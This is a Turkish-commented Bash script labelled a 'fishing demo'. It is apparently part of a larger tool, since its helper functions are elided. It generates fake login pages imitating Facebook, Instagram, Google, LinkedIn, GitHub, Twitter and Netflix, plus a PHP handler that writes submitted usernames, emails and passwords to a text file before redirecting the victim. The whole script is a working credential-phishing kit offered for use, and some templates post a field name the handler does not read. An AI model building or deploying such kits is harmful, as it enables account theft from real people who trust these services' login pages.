#!/bin/bash

# ... (Önceki kısımlar aynı kalır, sadece menü ve şablonlar güncellenir)

# Menü gösterimi
show_menu() {
    echo -e "${GREEN}"
    echo "------------ FISHING DEMO ------------"
    echo "1. Facebook"
    echo "2. Instagram"
    echo "3. Google"
    echo "4. LinkedIn"
    echo "5. GitHub"
    echo "6. Twitter"
    echo "7. Netflix"
    echo "8. Çıkış"
    echo "--------------------------------------"
    echo -e "${NC}"
}

# ... (Diğer fonksiyonlar aynı)

# Ana işlem
trap cleanup EXIT
check_deps

while true; do
    show_menu
    read -p "Seçenek: " choice

    case $choice in
        1)
            echo -e "${CYAN}[*] Facebook şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
</head>
<body>
    <h1>Facebook'a Giriş Yap</h1>
    <form action="submit.php" method="POST">
        <input type="text" name="email" placeholder="E-posta">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Giriş Yap</button>
    </form>
</body>
</html>
EOF
            ;;

        2)
            echo -e "${CYAN}[*] Instagram şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
</head>
<body>
    <h1>Instagram'a Giriş Yap</h1>
    <form action="submit.php" method="POST">
        <input type="text" name="username" placeholder="Kullanıcı Adı">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Giriş Yap</button>
    </form>
</body>
</html>
EOF
            ;;

        3)
            echo -e "${CYAN}[*] Google şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>Google Giriş</title>
</head>
<body>
    <h1>Google Hesabınıza Giriş Yapın</h1>
    <form action="submit.php" method="POST">
        <input type="email" name="email" placeholder="E-posta veya telefon">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Sonraki</button>
    </form>
</body>
</html>
EOF
            ;;

        4)
            echo -e "${CYAN}[*] LinkedIn şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Giriş</title>
</head>
<body>
    <h1>LinkedIn'e Giriş Yap</h1>
    <form action="submit.php" method="POST">
        <input type="text" name="email" placeholder="E-posta">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Giriş</button>
    </form>
</body>
</html>
EOF
            ;;

        5)
            echo -e "${CYAN}[*] GitHub şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>GitHub Giriş</title>
</head>
<body>
    <h1>GitHub'a Giriş Yap</h1>
    <form action="submit.php" method="POST">
        <input type="text" name="username" placeholder="Kullanıcı Adı">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Giriş</button>
    </form>
</body>
</html>
EOF
            ;;

        6)
            echo -e "${CYAN}[*] Twitter şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>Twitter Giriş</title>
</head>
<body>
    <h1>Twitter'a Giriş Yap</h1>
    <form action="submit.php" method="POST">
        <input type="text" name="username" placeholder="Kullanıcı Adı">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Giriş</button>
    </form>
</body>
</html>
EOF
            ;;

        7)
            echo -e "${CYAN}[*] Netflix şablonu hazırlanıyor...${NC}"
            cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>Netflix Giriş</title>
</head>
<body>
    <h1>Netflix'e Giriş Yap</h1>
    <form action="submit.php" method="POST">
        <input type="email" name="email" placeholder="E-posta">
        <input type="password" name="pass" placeholder="Şifre">
        <button type="submit">Giriş Yap</button>
    </form>
</body>
</html>
EOF
            ;;

        8)
            echo -e "${RED}[!] Çıkılıyor...${NC}"
            exit 0
            ;;

        *)
            echo -e "${RED}[!] Geçersiz seçenek!${NC}"
            ;;
    esac

    # Submit.php dosyası (Aynı kalır)
    cat <<EOF > submit.php
<?php
\$data = "Email/Kullanıcı Adı: " . \$_POST['email'] . " | Şifre: " . \$_POST['pass'] . "\n";
file_put_contents('data.txt', \$data, FILE_APPEND);
header('Location: https://example.com'); // Gerçek siteye yönlendirme
?>
EOF

    start_server
    capture_data
done
